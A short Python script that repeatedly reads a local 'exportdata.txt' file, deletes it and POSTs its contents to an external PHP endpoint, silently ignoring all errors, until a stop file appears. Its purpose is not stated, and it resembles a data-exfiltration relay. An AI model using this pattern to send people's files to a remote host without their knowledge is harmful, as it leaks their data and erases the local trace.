import requests
from pathlib import Path
import os
import time

exportData = ''
while not os.path.isfile('Files/stop.txt'):
    time.sleep(5)
    try:
        script_location = Path(__file__).absolute().parent
        file_location = script_location / 'Files/exportdata.txt'
        file = file_location.open()
        exportData = ''
        for line in file:
            exportData += line
            
        exportData += '\n'
        file.close()
        os.remove("Files/exportdata.txt")
        r = requests.post('https://boolinbase.com/commnet.php', data={'data': exportData})
        print(r.text)
        r.close()
    except:
        continue
# os.remove("Files/stop.txt")

